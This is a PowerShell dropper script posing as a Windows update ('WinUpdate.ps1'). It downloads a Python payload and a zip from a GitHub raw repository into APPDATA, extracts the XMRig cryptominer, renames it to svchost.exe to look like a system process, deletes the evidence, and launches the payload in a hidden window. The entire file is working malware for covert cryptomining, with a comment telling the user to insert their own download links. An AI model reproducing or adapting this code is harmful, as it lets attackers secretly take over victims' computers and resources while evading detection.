# --- THE SMART IGNITER (WinUpdate.ps1) ---
$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Configuration - REPLACE WITH YOUR GITHUB RAW LINKS
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/UpdateData.zip"

# 2. Preparation
if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }

# 3. Deployment
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdateData.zip"

# 4. Smart Unpacking
Expand-Archive -Path "$Path\UpdateData.zip" -DestinationPath $Path -Force

# Search for xmrig.exe anywhere in the folder (in case it's in a subfolder)
$Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
if ($Miner) {
    Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force
}

# Cleanup
Remove-Item -Path "$Path\UpdateData.zip"
Get-ChildItem -Path $Path -Directory | Remove-Item -Recurse -Force # Clean up any subfolders

# 5. Activation
if (Test-Path "$Path\WinServices.py") {
    Start-Process -FilePath "pythonw.exe" -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WindowStyle Hidden
}
